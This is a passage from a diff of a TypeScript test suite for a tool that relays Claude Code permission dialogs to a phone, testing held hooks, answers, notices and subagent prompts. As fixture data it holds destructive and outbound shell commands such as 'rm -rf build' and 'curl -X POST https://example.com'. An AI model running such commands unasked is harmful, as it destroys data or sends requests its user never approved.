+      expect(outcome).toBe('delivered');
+      expect(await hook).toBe('allow');
+      expect(ptySubmits).toEqual([]);
+      expect(cards()).toHaveLength(0);
+    });
+
+    test("with Claude's dialog on screen, a phone answer still goes through the hook and nothing is typed", async () => {
+      // The no-typing invariant at its sharpest: the dialog is rendered and
+      // observed, its "1. Yes" matches the card's "Yes", so the screen guard
+      // would let a digit through. The held path must answer first.
+      const { tracker, card, hook, handlers } = held('claude-held-onscreen');
+      tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
+      expect(tracker.observedPromptOptions()?.[0]?.label).toBe('Yes');
+      expect(await handlers.relayAnswer(SID, card.id, 'Yes')).toBe('delivered');
+      expect(await hook).toBe('allow');
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('chat text is refused while a held dialog is up, even before the screen parse sees it (#1142 + #1126)', async () => {
+      const { card, hook, handlers, sent } = held('claude-held-chat');
+      sessionRegistry.attachConnection(SID, 'conn-chat' as UUID);
+      // No render observed yet: only the hold says a dialog is up.
+      await handlers.onUserInput('conn-chat' as UUID, SID, 'please go ahead', false);
+      expect(ptySubmits).toEqual([]);
+      const refusal = sent.find((m) => m.type === 'error') as
+        | { code?: string; message?: string }
+        | undefined;
+      expect(refusal?.code).toBe('PROMPT_WAITING');
+      // A held prompt may already be answered in the terminal (its tool
+      // running), so the refusal does not claim a dialog is up.
+      expect(refusal?.message).toBe(PROMPT_WAITING_HELD_MESSAGE);
+      // Answered from the phone: the dialog is gone, chat flows again.
+      await handlers.relayAnswer(SID, card.id, 'Yes');
+      expect(await hook).toBe('allow');
+      await handlers.onUserInput('conn-chat' as UUID, SID, 'thanks', false);
+      expect(ptySubmits).toEqual(['thanks']);
+    });
+
+    test('phone No with a message denies with that message as the reason', async () => {
+      const { card, hook, handlers } = held('claude-held-no');
+      await handlers.onAnswer('conn-1' as UUID, SID, card.id, 'No', undefined, {
+        message: 'run the tests first',
+      });
+      expect(await hook).toEqual({ behavior: 'deny', message: 'run the tests first' });
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('phone setMode echoes it; phone addRules echoes it for this session', async () => {
+      const a = held('claude-held-mode', { permission_suggestions: E5_SUGGESTIONS });
+      const mode = a.card.options[1] as QuestionOption;
+      await a.handlers.relayAnswer(SID, a.card.id, mode.label);
+      expect(await a.hook).toEqual({
+        behavior: 'allow',
+        updatedPermissions: [E5_SUGGESTIONS[1]],
+      });
+
+      const rule = {
+        type: 'addRules',
+        rules: [{ toolName: 'Bash', ruleContent: 'touch e5-marker.txt' }],
+        behavior: 'allow',
+        destination: 'localSettings',
+      };
+      const hookB = hookServer.firePermission({
+        session_id: 'claude-held-mode',
+        hook_event_name: 'PermissionRequest',
+        tool_name: 'Bash',
+        tool_input: { command: 'touch e5-other.txt' },
+        permission_suggestions: [rule],
+      });
+      const cardB = cards()[0] as Question;
+      expect(cardB.options[1]?.label).toBe('Yes, allow touch e5-marker.txt for this session');
+      // The in-app tap sends the option VALUE.
+      await a.handlers.onAnswer('conn-1' as UUID, SID, cardB.id, '2');
+      expect(await hookB).toEqual({
+        behavior: 'allow',
+        updatedPermissions: [{ ...rule, destination: 'session' }],
+      });
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('Cancel on a held card denies through the hook and types no Esc', async () => {
+      const { card, hook, handlers } = held('claude-held-cancel');
+      await handlers.onAnswer('conn-1' as UUID, SID, card.id, '', undefined, { cancel: true });
+      expect(await hook).toBe('deny');
+      expect(ptySubmits).toEqual([]);
+      expect(cards()).toHaveLength(0);
+    });
+
+    test('a duplicate delivery of the same tap resolves once and reports delivered (#752)', async () => {
+      const { card, hook, handlers } = held('claude-held-dup');
+      const [a, b] = await Promise.all([
+        handlers.relayAnswer(SID, card.id, 'Yes'),
+        handlers.relayAnswer(SID, card.id, '1'),
+      ]);
+      expect([a, b]).toEqual(['delivered', 'delivered']);
+      expect(await hook).toBe('allow');
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('free text on a held card is refused; the card and the hold stay', async () => {
+      const { card, handlers, sent, handle, hook } = held('claude-held-text');
+      const outcome = await handlers.onAnswer(
+        'conn-1' as UUID,
+        SID,
+        card.id,
+        'no, do not create the file',
+      );
+      expect(outcome).toBeUndefined();
+      expect(ptySubmits).toEqual([]);
+      expect((sent.find((m) => m.type === 'error') as { code?: string })?.code).toBe(
+        'STALE_ANSWER',
+      );
+      expect(cards().map((q) => q.id)).toEqual([card.id]);
+      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('resolved');
+      expect(await hook).toBe('deny');
+    });
+
+    test('a Yes answered in the terminal: the paired PostToolUse closes the hold empty and dismisses the card', async () => {
+      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
+      build({
         realTracker: true,
         realMessageApi: true,
         liveQuestionDeps: true,
+        broadcastResolvedLog,
       });
-      lockSession('claude-unheld-1');
+      lockSession('claude-local-yes');
+      const call = {
+        session_id: 'claude-local-yes',
+        tool_name: 'Bash',
+        tool_input: { command: 'ls' },
+      };
+      // Claude announces the call, then asks about it about 10 ms later.
+      hookServer.fire('PreToolUse', {
+        ...call,
+        hook_event_name: 'PreToolUse',
+        tool_use_id: 'tu-1',
+      });
+      const hook = hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' });
+      const card = cards()[0] as Question;
 
-      expect(await bash('claude-unheld-1', 'curl example.com')).toBe('passthrough');
-      // Nothing is registered until the prompt actually renders.
+      // A DIFFERENT call with the same command finishing must not close it:
+      // the prompt was paired with tu-1.
+      hookServer.fire('PostToolUse', {
+        ...call,
+        hook_event_name: 'PostToolUse',
+        tool_use_id: 'tu-0',
+      });
+      expect(cards().map((q) => q.id)).toEqual([card.id]);
+
+      // The terminal's Yes: Claude runs the tool and reports tu-1.
+      hookServer.fire('PostToolUse', {
+        ...call,
+        hook_event_name: 'PostToolUse',
+        tool_use_id: 'tu-1',
+      });
+      expect(await hook).toBe('passthrough');
+      expect(cards()).toHaveLength(0);
+      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('a Yes in the terminal whose tool then fails (PostToolUseFailure) also closes the hold', async () => {
+      build({ realTracker: true, realMessageApi: true, liveQuestionDeps: true });
+      lockSession('claude-local-fail');
+      const call = {
+        session_id: 'claude-local-fail',
+        tool_name: 'Bash',
+        tool_input: { command: 'false' },
+      };
+      hookServer.fire('PreToolUse', {
+        ...call,
+        hook_event_name: 'PreToolUse',
+        tool_use_id: 'tu-f',
+      });
+      const hook = hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' });
+      hookServer.fire('PostToolUseFailure', {
+        ...call,
+        hook_event_name: 'PostToolUseFailure',
+        tool_use_id: 'tu-f',
+        error: 'exit 1',
+      });
+      expect(await hook).toBe('passthrough');
+      expect(cards()).toHaveLength(0);
+    });
+
+    test('a No or Esc in the terminal: Claude closes the held request and the card is dismissed', async () => {
+      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
+      const { handle } = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        broadcastResolvedLog,
+      });
+      lockSession('claude-local-no');
+      const client = new AbortController();
+      void hookServer.firePermission(
+        {
+          session_id: 'claude-local-no',
+          hook_event_name: 'PermissionRequest',
+          tool_name: 'Bash',
+          tool_input: { command: 'rm x' },
+        },
+        client.signal,
+      );
+      const card = cards()[0] as Question;
+      client.abort();
+      expect(cards()).toHaveLength(0);
+      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
+      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('closed');
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('a new user prompt closes a main prompt left open after its hold was released', async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      const { handle } = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        holdMs: 20,
+        noticeLog,
+      });
+      lockSession('claude-local-next');
+      const hook = hookServer.firePermission({
+        session_id: 'claude-local-next',
+        hook_event_name: 'PermissionRequest',
+        tool_name: 'Bash',
+        tool_input: { command: 'rm y' },
+      });
+      const card = cards()[0] as Question;
+      expect(await hook).toBe('passthrough'); // released at the deadline
+      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('closed');
+
+      // A subagent's prompt submission is not the user's: nothing closes.
+      hookServer.fire('UserPromptSubmit', {
+        session_id: 'claude-local-next',
+        hook_event_name: 'UserPromptSubmit',
+        prompt: 'x',
+        agent_id: 'agent-1',
+      });
+      expect(noticeLog.filter((n) => n.reason === 'dismissed')).toHaveLength(0);
+
+      // The terminal's No fired nothing; the user's next prompt proves the
+      // dialog is gone, and the deadline notice is cleared.
+      hookServer.fire('UserPromptSubmit', {
+        session_id: 'claude-local-next',
+        hook_event_name: 'UserPromptSubmit',
+        prompt: 'next',
+      });
+      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline', 'dismissed']);
+    });
+
+    test('an early release by a name + input match keeps the dialog open, tells the phone, and its redraw builds no typed card', async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      const { tracker, card, hook } = held(
+        'claude-held-early',
+        {},
+        { orphanDebounceMs: 5, noticeLog },
+      );
+      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
+      tracker.onOrphanPTYPrompt(dialog);
+      // Unpaired (no PreToolUse seen): an identical call's PostToolUse can
+      // only release the hold to the terminal.
+      hookServer.fire('PostToolUse', {
+        session_id: 'claude-held-early',
+        hook_event_name: 'PostToolUse',
+        tool_name: 'Bash',
+        tool_input: { command: 'touch e5-marker.txt' },
+        tool_use_id: 'tu-other',
+      });
+      expect(await hook).toBe('passthrough');
+      expect(cards().map((q) => q.id)).not.toContain(card.id);
+      // Not silent (#1126 review): the card is gone, so the phone is told
+      // the prompt went back to the terminal.
+      expect(noticeLog).toEqual([
+        { questionId: card.id, text: 'Allow Bash: touch e5-marker.txt', reason: 'released' },
+      ]);
+      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
+      await new Promise((resolve) => setTimeout(resolve, 30));
+      expect(cards()).toHaveLength(0);
+      expect(ptySubmits).toEqual([]);
+      // The terminal answers it later: the notice clears.
+      hookServer.fire('UserPromptSubmit', {
+        session_id: 'claude-held-early',
+        hook_event_name: 'UserPromptSubmit',
+        prompt: 'next',
+      });
+      expect(noticeLog.map((n) => n.reason)).toEqual(['released', 'dismissed']);
+    });
+
+    test('the release notice wording follows the cause and the mode', () => {
+      expect(terminalNoticeReason('deadline', true)).toBe('hold_deadline');
+      expect(terminalNoticeReason('deadline', false)).toBe('hold_deadline_no_terminal');
+      expect(terminalNoticeReason('released', true)).toBe('released');
+      expect(terminalNoticeReason('released', false)).toBe('released_no_terminal');
+    });
+
+    test('a non-string message is dropped, not thrown on: the No still denies', async () => {
+      const { card, hook, handlers } = held('claude-held-badmsg');
+      await handlers.onAnswer('conn-1' as UUID, SID, card.id, 'No', undefined, {
+        message: 42 as unknown as string,
+      });
+      expect(await hook).toBe('deny');
+    });
+
+    test('a transcript rotation releases a live hold and clears its card', async () => {
+      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
+      build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        broadcastResolvedLog,
+      });
+      lockSession('claude-rot-A');
+      const hook = hookServer.firePermission({
+        session_id: 'claude-rot-A',
+        hook_event_name: 'PermissionRequest',
+        tool_name: 'Bash',
+        tool_input: { command: 'ls' },
+      });
+      const card = cards()[0] as Question;
+      // The way a rotation actually arrives post-#930: SessionEnd for the old
+      // id, then any event for the new one.
+      hookServer.fire('SessionEnd', {
+        session_id: 'claude-rot-A',
+        hook_event_name: 'SessionEnd',
+        reason: 'clear',
+      });
+      lockSession('claude-rot-B');
+      expect(await hook).toBe('passthrough');
+      expect(cards()).toHaveLength(0);
+      expect(broadcastResolvedLog.map((r) => r.questionId)).toContain(card.id);
+    });
+
+    test('a released main prompt stops suppressing after the hold length: a redraw takes the guarded hook-less path', async () => {
+      const { tracker, card, hook } = held(
+        'claude-held-expire',
+        {},
+        { holdMs: 25, orphanDebounceMs: 5 },
+      );
+      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
+      tracker.onOrphanPTYPrompt(dialog);
+      expect(await hook).toBe('passthrough'); // released at the deadline
+      expect(cards()).toHaveLength(0);
+      // Past the hold length (a No in the terminal fires no hook, so nothing
+      // would ever end the suppression): a redraw is treated as hook-less.
+      await new Promise((resolve) => setTimeout(resolve, 40));
+      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
+      await new Promise((resolve) => setTimeout(resolve, 30));
+      const orphan = cards();
+      expect(orphan).toHaveLength(1);
+      expect(orphan[0]?.id).not.toBe(card.id);
+      // A typed card, answered only on an exact label match (#1134); nothing
+      // is typed without an answer.
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test('closing the session releases a live hold', async () => {
+      const { hook, handle } = held('claude-held-close');
+      handle.closeBinder();
+      expect(await hook).toBe('passthrough');
+      expect(cards()).toHaveLength(0);
+    });
+
+    test("the dialog's render during the hold is an echo, and after the deadline a redraw still builds no typed card", async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      // The hold length also bounds how long the released prompt suppresses
+      // orphans, so it is long enough to cover the redraws below.
+      const { tracker, card, hook, handlers } = held(
+        'claude-held-deadline',
+        {},
+        { holdMs: 150, orphanDebounceMs: 5, noticeLog },
+      );
+      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
+      tracker.onOrphanPTYPrompt(dialog);
+      expect(cards().map((q) => q.id)).toEqual([card.id]);
+
+      // The deadline: the empty response, the card dismissed, the notice
+      // naming the ask.
+      expect(await hook).toBe('passthrough');
+      expect(cards()).toHaveLength(0);
+      expect(noticeLog).toEqual([
+        { questionId: card.id, text: 'Allow Bash: touch e5-marker.txt', reason: 'hold_deadline' },
+      ]);
+
+      // Claude's dialog is still up; a redraw must not become an orphan card
+      // the phone could answer by typing.
+      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
+      await new Promise((resolve) => setTimeout(resolve, 30));
       expect(cards()).toHaveLength(0);
 
-      tracker.onOrphanPTYPrompt(claudeDialog('curl example.com'));
+      // A late answer to the dismissed card is stale, and nothing is typed.
+      expect(await handlers.relayAnswer(SID, card.id, 'Yes')).toBe('stale');
+      expect(ptySubmits).toEqual([]);
+      // ...and it does not close the prompt still waiting in the terminal:
+      // the notice stays and a later redraw is still no orphan card.
+      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline']);
+      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
+      await new Promise((resolve) => setTimeout(resolve, 30));
+      expect(cards()).toHaveLength(0);
+    });
+  });
 
-      const registered = cards();
-      expect(registered).toHaveLength(1);
-      // No usable permission_suggestions, so the hook built the Yes/No fallback;
-      // the merge takes the screen's three options (#1134: a merged card's
-      // options always come from the screen), or a phone "No" would type 2
-      // and select the persistent allow.
-      expect(registered[0]?.options.map((o) => o.value)).toEqual(['1', '2', '3']);
-      expect(registered[0]?.options[2]?.label.startsWith('No')).toBe(true);
+  /**
+   * #1126: a background subagent's dialog does not render while its hook is
+   * held. With a local terminal the hook passes through and the phone gets
+   * an informational notice when the dialog renders, never a card; without
+   * one the prompt is held and answerable like a main prompt.
+   */
+  describe('subagent prompts by local terminal (#1126)', () => {
+    function lockSession(id: string): void {
+      hookServer.fire('Notification', {
+        session_id: id,
+        hook_event_name: 'Notification',
+        transcript_path: path.join(tmpDir, `${id}.jsonl`),
+        notification_type: 'auth_success',
+        message: '',
+      });
+    }
+    function cards(): Question[] {
+      return [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
+    }
+    const subCall = (session: string) => ({
+      session_id: session,
+      agent_id: 'agent-bg',
+      agent_type: 'code-reviewer',
+      tool_name: 'Bash',
+      tool_input: { command: 'rm -rf build' },
     });
 
-    test('a redraw of the same dialog does not push a second card', async () => {
+    test('wrapper mode: passthrough, a notice when the dialog renders, no card, nothing typed, cleared on answer', async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
       const { tracker } = build({
         realTracker: true,
         realMessageApi: true,
         liveQuestionDeps: true,
+        orphanDebounceMs: 5,
+        noticeLog,
       });
-      lockSession('claude-unheld-2');
-      await bash('claude-unheld-2', 'curl example.com');
+      lockSession('claude-sub-wrap');
+      const call = subCall('claude-sub-wrap');
+      expect(
+        await hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' }),
+      ).toBe('passthrough');
+      expect(noticeLog).toEqual([]); // nothing until the dialog renders
 
-      tracker.onOrphanPTYPrompt(claudeDialog('curl example.com'));
-      tracker.onOrphanPTYPrompt(claudeDialog('curl example.com'));
-      await new Promise((resolve) => setTimeout(resolve, 20));
+      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
+      tracker.onOrphanPTYPrompt(dialog);
+      expect(noticeLog).toHaveLength(1);
+      expect(noticeLog[0]?.reason).toBe('subagent');
+      expect(noticeLog[0]?.text).toBe('code-reviewer · Bash: rm -rf build');
+      // Informational only: no card exists to answer, so nothing can be typed.
+      expect(cards()).toHaveLength(0);
 
-      expect(cards()).toHaveLength(1);
-      expect(messageApiLog.questionCalls).toBe(1);
+      // A redraw is the same open prompt, never an orphan card: the phone
+      // keeps exactly one artifact, the notice.
+      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
+      await new Promise((resolve) => setTimeout(resolve, 30));
+      expect(cards()).toHaveLength(0);
+      expect(ptySubmits).toEqual([]);
+
+      // Answered Yes in the terminal: the tool runs, the notice clears.
+      hookServer.fire('PostToolUse', { ...call, hook_event_name: 'PostToolUse' });
+      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent', 'dismissed']);
+      expect(noticeLog[1]?.questionId).toBe(noticeLog[0]?.questionId as UUID);
     });
 
-    test('a terminal "No" leaves no stale card once the next prompt renders', async () => {
-      // A denial fires no tool call, so `cancelExternallyResolved` never runs;
-      // the next render taking the render-owned slot is what retires card A.
+    test("wrapper mode: a teammate's prompt answered No in the terminal is cleared by its next call; then a hook-less prompt gets its card", async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
       const { tracker } = build({
         realTracker: true,
         realMessageApi: true,
         liveQuestionDeps: true,
+        orphanDebounceMs: 5,
+        noticeLog,
       });
-      lockSession('claude-unheld-3');
-      await bash('claude-unheld-3', 'echo A');
-      tracker.onOrphanPTYPrompt(claudeDialog('echo A'));
-      const cardA = cards()[0]?.id;
-
-      await bash('claude-unheld-3', 'echo B');
-      tracker.onOrphanPTYPrompt(claudeDialog('echo B'));
-
-      const remaining = cards();
-      expect(remaining).toHaveLength(1);
-      expect(remaining[0]?.id).not.toBe(cardA);
-      expect(remaining[0]?.text).toContain('echo B');
+      lockSession('claude-sub-no');
+      const call = subCall('claude-sub-no');
+      expect(
+        await hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' }),
+      ).toBe('passthrough');
+      tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
+      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent']);
+      // The user answers No in the terminal: no hook fires. The teammate
+      // moves on: its next call proves the No, so the prompt is cleared and
+      // its notice dismissed without waiting for SubagentStop.
+      hookServer.fire('PreToolUse', {
+        ...call,
+        hook_event_name: 'PreToolUse',
+        tool_input: { command: 'ls' },
+        tool_use_id: 'tu-next',
+      });
+      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent', 'dismissed']);
+      // A hook-less prompt (a sandbox network dialog) renders next: the
+      // cleared entry no longer suppresses it, so it gets its card.
+      tracker.onOrphanPTYPrompt({
+        id: generateId(),
+        text: 'Allow network access to example.com?',
+        options: [
+          { label: 'Yes', value: '1', isRecommended: true, isYes: false, isNo: false },
+          { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: false },
+        ],
+        allowsFreeText: false,
+        isAnswered: false,
+        source: 'pty',
+      });
+      await new Promise((resolve) => setTimeout(resolve, 40));
+      expect(cards().map((q) => q.text)).toEqual(['Allow network access to example.com?']);
+      expect(ptySubmits).toEqual([]);
     });
 
-    test('two outstanding hooks before a render push the screen, never the other hook', async () => {
+    test('wrapper mode: a subagent prompt that has not rendered does not hide a hook-less prompt', async () => {
       const { tracker } = build({
         realTracker: true,
         realMessageApi: true,
         liveQuestionDeps: true,
         orphanDebounceMs: 5,
       });
-      lockSession('claude-unheld-4');
-      await bash('claude-unheld-4', 'echo A');
-      await bash('claude-unheld-4', 'rm -rf B');
-
-      // Dialog A renders first: pairing by agent key would dress it as B.
-      const screenA = claudeDialog('echo A');
-      tracker.onOrphanPTYPrompt(screenA);
-      await waitFor(() => cards().length > 0);
-
-      const registered = cards();
-      expect(registered).toHaveLength(1);
-      expect(registered[0]?.text).toBe(screenA.text);
-      expect(registered[0]?.text).not.toContain('rm -rf B');
+      lockSession('claude-sub-quiet');
+      // A main-agent hook already took the parked record's place, so the
+      // next render cannot be the subagent's own (it would pair first).
+      expect(
+        await hookServer.firePermission({
+          ...subCall('claude-sub-quiet'),
+          hook_event_name: 'PermissionRequest',
+        }),
+      ).toBe('passthrough');
+      hookServer.fire('PreToolUse', {
+        ...subCall('claude-sub-quiet'),
+        hook_event_name: 'PreToolUse',
+        tool_input: { command: 'something else' },
+      });
+      // A hook-less prompt (here a sandbox network dialog) renders.
+      tracker.onOrphanPTYPrompt({
+        id: generateId(),
+        text: 'Allow network access to example.com?',
+        options: [
+          { label: 'Yes', value: '1', isRecommended: true, isYes: false, isNo: false },
+          { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: false },
+        ],
+        allowsFreeText: false,
+        isAnswered: false,
+        source: 'pty',
+      });
+      await new Promise((resolve) => setTimeout(resolve, 40));
+      expect(cards().map((q) => q.text)).toEqual(['Allow network access to example.com?']);
     });
 
-    test('with no usable hook suggestions, a phone "No" types the screen\'s No (3), not the fallback\'s 2', async () => {
-      // The answer side of the screen-numbered merge (#1134): an unheld card
-      // has no hold, so `handleAnswer` resolves the label to the option VALUE
-      // and types it. The tracker's screen reads are wired through
-      // `trackerScreenDeps`, the same helper cli.ts uses.
-      const { tracker } = build({
+    test('daemon mode: the deadline notice says remi attach, the only way left to answer', async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      build({
+        realTracker: true,
+        realMessageApi: true,
+        hasLocalTerminal: false,
+        holdMs: 20,
+        noticeLog,
+      });
+      lockSession('claude-daemon-deadline');
+      const hook = hookServer.firePermission({
+        session_id: 'claude-daemon-deadline',
+        hook_event_name: 'PermissionRequest',
+        tool_name: 'Bash',
+        tool_input: { command: 'ls' },
+      });
+      expect(await hook).toBe('passthrough');
+      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline_no_terminal']);
+    });
+
+    test('daemon mode: Claude closing the request with no hook (No, Esc, its own timeout) dismisses the card before the long deadline', async () => {
+      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      const { handle } = build({
+        realTracker: true,
+        realMessageApi: true,
+        hasLocalTerminal: false,
+        holdMs: 3_540_000,
+        broadcastResolvedLog,
+        noticeLog,
+      });
+      lockSession('claude-daemon-autodeny');
+      const claude = new AbortController();
+      void hookServer.firePermission(
+        {
+          session_id: 'claude-daemon-autodeny',
+          hook_event_name: 'PermissionRequest',
+          tool_name: 'Bash',
+          tool_input: { command: 'curl -X POST https://example.com' },
+          permission_mode: 'auto',
+        },
+        claude.signal,
+      );
+      const card = cards()[0] as Question;
+      // Claude closes the held request without firing a hook.
+      claude.abort();
+      expect(cards()).toHaveLength(0);
+      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
+      // Not a deadline: no "answer at the terminal" notice.
+      expect(noticeLog).toEqual([]);
+      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('closed');
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test("daemon mode: an auto-mode fallback's 2:00 auto-deny arrives as PermissionDenied and dismisses the card before the long deadline", async () => {
+      // Measured live on Claude Code 2.1.287 (#1126): the auto-deny fires
+      // PermissionDenied for the held call 120 s after the prompt, before
+      // any close of the request reaches remi.
+      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      const { handle } = build({
+        realTracker: true,
+        realMessageApi: true,
+        hasLocalTerminal: false,
+        holdMs: 3_540_000,
+        broadcastResolvedLog,
+        noticeLog,
+      });
+      lockSession('claude-daemon-autodeny-pd');
+      const call = {
+        session_id: 'claude-daemon-autodeny-pd',
+        tool_name: 'Bash',
+        tool_input: { command: 'curl -X POST https://example.com' },
+        permission_mode: 'auto',
+      };
+      hookServer.fire('PreToolUse', {
+        ...call,
+        hook_event_name: 'PreToolUse',
+        tool_use_id: 'tu-autodeny',
+      });
+      const hook = hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' });
+      const card = cards()[0] as Question;
+      hookServer.fire('PermissionDenied', {
+        ...call,
+        hook_event_name: 'PermissionDenied',
+        tool_use_id: 'tu-autodeny',
+        reason: 'The server-side auto mode classifier judged this action dangerous',
+      });
+      expect(cards()).toHaveLength(0);
+      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
+      expect(noticeLog).toEqual([]);
+      // The hold ends with the empty response; Claude has already decided.
+      expect(await hook).toBe('passthrough');
+      const yes = card.options.find((o) => o.isYes) as QuestionOption;
+      expect(handle.gate.answerHeld(card.id, { kind: 'option', option: yes })).toBe('closed');
+      expect(ptySubmits).toEqual([]);
+    });
+
+    test("daemon mode: a subagent's request pairs with its own PreToolUse, so only that call's PostToolUse closes it", async () => {
+      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
+      build({
         realTracker: true,
         realMessageApi: true,
         liveQuestionDeps: true,
+        hasLocalTerminal: false,
+        noticeLog,
       });
-      lockSession('claude-unheld-7');
-      await bash('claude-unheld-7', 'curl example.com');
-      tracker.onOrphanPTYPrompt(claudeDialog('curl example.com'));
-      const card = cards()[0];
-      if (!card) throw new Error('no card registered');
-      const no = card.options.find((o) => o.label.startsWith('No'));
-      if (!no) throw new Error('no "No" option on the card');
+      lockSession('claude-sub-pair');
+      const call = subCall('claude-sub-pair');
+      hookServer.fire('PreToolUse', {
+        ...call,
+        hook_event_name: 'PreToolUse',
+        tool_use_id: 'tu-sub',
+      });
+      let settled = false;
+      const hook = hookServer
+        .firePermission({ ...call, hook_event_name: 'PermissionRequest' })
+        .then((d) => {
+          settled = true;
+          return d;
+        });
+      const card = cards()[0] as Question;
+      // An identical call of the same agent with another id finishes: not
+      // this prompt's call, so the hold and the card stay.
+      hookServer.fire('PostToolUse', {
+        ...call,
+        hook_event_name: 'PostToolUse',
+        tool_use_id: 'tu-twin',
+      });
+      await new Promise((resolve) => setTimeout(resolve, 5));
+      expect(settled).toBe(false);
+      expect(cards().map((q) => q.id)).toEqual([card.id]);
+      expect(noticeLog).toEqual([]);
+      // Its own call's PostToolUse (Yes answered at the terminal) closes it.
+      hookServer.fire('PostToolUse', {
+        ...call,
+        hook_event_name: 'PostToolUse',
+        tool_use_id: 'tu-sub',
+      });
+      expect(await hook).toBe('passthrough');
+      expect(cards()).toHaveLength(0);
+      expect(noticeLog).toEqual([]);
+    });
 
+    test("daemon mode: a held subagent card (its dialog not on screen) does not hide a main hook-less dialog's card", async () => {
+      // End to end, with the tracker's live-question check wired the way
+      // cli.ts wires it: the held subagent card is registered, but its
+      // dialog does not render while held, so a hook-less main dialog
+      // (sandbox network) rendering now must still reach the phone.
+      const { tracker, handle } = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        hasLocalTerminal: false,
+        orphanDebounceMs: 5,
+      });
+      lockSession('claude-sub-held-hookless');
+      const hook = hookServer.firePermission({
+        ...subCall('claude-sub-held-hookless'),
+        hook_event_name: 'PermissionRequest',
+      });
+      const held = cards();
+      expect(held).toHaveLength(1);
+      expect(held[0]?.agentId).toBe('agent-bg');
+      tracker.onOrphanPTYPrompt({
+        id: generateId(),
+        text: 'Allow network access to example.com?',
+        options: [
+          { label: 'Yes', value: '1', isRecommended: true, isYes: false, isNo: false },
+          { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: false },
+        ],
+        allowsFreeText: false,
+        isAnswered: false,
+        source: 'pty',
+      });
+      await new Promise((resolve) => setTimeout(resolve, 40));
+      expect(cards().map((q) => q.text)).toContain('Allow network access to example.com?');
+      expect(ptySubmits).toEqual([]);
+      handle.gate.forceRelease('test');
+      await hook;
+    });
+
+    test('daemon mode: a held subagent prompt does not refuse chat (its dialog is not on screen)', async () => {
+      const built = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        hasLocalTerminal: false,
+      });
+      lockSession('claude-sub-chat');
+      const hook = hookServer.firePermission({
+        ...subCall('claude-sub-chat'),
+        hook_event_name: 'PermissionRequest',
+      });
+      expect(cards()).toHaveLength(1);
+      const sent: ProtocolMessage[] = [];
+      const handlers = createInputHandlers({
+        sessionRegistry,
+        bindingStore,
+        send: (_c, m) => {
+          sent.push(m);
+          return true;
+        },
+        ...gateAnswerDeps(() => built.handle.gate),
+        ...trackerScreenDeps(() => built.tracker),
+      });
+      sessionRegistry.attachConnection(SID, 'conn-sub-chat' as UUID);
+      await handlers.onUserInput('conn-sub-chat' as UUID, SID, 'status?', false);
